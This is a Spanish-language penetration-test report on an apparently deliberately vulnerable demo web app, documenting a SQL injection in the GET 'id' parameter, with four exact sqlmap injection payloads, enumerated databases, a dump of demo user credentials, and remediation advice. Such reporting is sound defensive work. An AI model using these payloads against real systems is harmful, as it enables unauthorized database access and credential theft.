# Informe de Auditoría de Seguridad – SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-27T11:38:52Z  
**Herramientas:** curl, sqlmap  
**Clasificación:** CRÍTICO

---

## 1. Resumen Ejecutivo

Se realizó un análisis DAST sobre la aplicación web disponible en `http://web.dev.local:8083`. Se identificó una vulnerabilidad crítica de **SQL Injection** en el parámetro GET `id`. La vulnerabilidad fue explotada con éxito, permitiendo la extracción completa de la base de datos `sqli_demo`, incluyendo credenciales en texto plano de 8 usuarios. El usuario de base de datos es `root@%`, con privilegios máximos.

---

## 2. Vectores Analizados

| Vector | Tipo | Parámetro | Método |
|--------|------|-----------|--------|
| `/?id=1&Submit=Submit` | Formulario HTML GET | `id` | GET |

La aplicación expone un formulario de búsqueda de usuarios en su página principal. El parámetro `id` se transmite por GET y se inyecta directamente en una consulta SQL sin sanitización.

---

## 3. Hallazgos

### Vulnerabilidad: SQL Injection (GET `id`)

- **Severidad:** Crítica (CVSS 9.8)
- **URL afectada:** `http://web.dev.local:8083/?id=1&Submit=Submit`
- **Parámetro vulnerable:** `id`
- **DBMS:** MySQL >= 5.1 (MariaDB fork)
- **SO del servidor:** Linux Debian
- **Stack tecnológico:** PHP 8.1.33, Apache 2.4.65

**Técnicas de inyección confirmadas:**

| Técnica | Título |
|---------|--------|
| Boolean-based blind | AND boolean-based blind – WHERE or HAVING clause (subquery - comment) |
| Error-based | MySQL >= 5.1 AND error-based – EXTRACTVALUE |
| Time-based blind | MySQL >= 5.0.12 AND time-based blind (query SLEEP) |
| UNION query | Generic UNION query (NULL) – 2 columns |

**Payloads exactos utilizados por sqlmap:**

```
# Boolean-based blind
id=1' AND 4855=(SELECT (CASE WHEN (4855=4855) THEN 4855 ELSE (SELECT 5578 UNION SELECT 1967) END))-- -&Submit=Submit

# Error-based
id=1' AND EXTRACTVALUE(7032,CONCAT(0x5c,0x716a7a7671,(SELECT (ELT(7032=7032,1))),0x716b7a6a71)) AND 'VNQE'='VNQE&Submit=Submit

# Time-based blind
id=1' AND (SELECT 8779 FROM (SELECT(SLEEP(5)))fHXT) AND 'DaGw'='DaGw&Submit=Submit

# UNION query
id=1' UNION ALL SELECT NULL,CONCAT(0x716a7a7671,0x677648566462786877766467765159474a775444736c5a416463474b5574416b48654d424e47426a,0x716b7a6a71)-- -&Submit=Submit
```

---

## 4. Evidencia de Explotación

### 4.1 Información del Servidor

- **Usuario de BD:** `root@%` (privilegios de superusuario)
- **Base de datos activa:** `sqli_demo`
- **Bases de datos enumeradas:** `information_schema`, `mysql`, `performance_schema`, `sqli_demo`, `sys`

### 4.2 Tabla `sqli_demo.users` – Volcado Completo

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ Las contraseñas se almacenan en **texto plano**, sin ningún tipo de hash ni cifrado.

---

## 5. Conclusión

La aplicación web `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection clásica en el parámetro GET `id`. La ausencia de validación de entrada y el uso de consultas SQL dinámicas sin prepared statements permiten a un atacante:

1. **Extraer** toda la información de la base de datos.
2. **Escalar** a otras bases de datos del servidor (mysql, sys, etc.).
3. **Comprometer** credenciales de todos los usuarios registrados (almacenadas en texto plano).
4. Potencialmente **ejecutar comandos en el sistema operativo** dado que el usuario de BD es `root@%`.

### Recomendaciones

- Implementar **Prepared Statements / Parameterized Queries** en todas las consultas SQL.
- Aplicar **validación y sanitización** estricta de entradas de usuario.
- Almacenar contraseñas con **algoritmos de hash seguros** (bcrypt, Argon2).
- Aplicar el **principio de mínimo privilegio** en las cuentas de base de datos.
- Implementar un **WAF** (Web Application Firewall) como capa adicional de defensa.
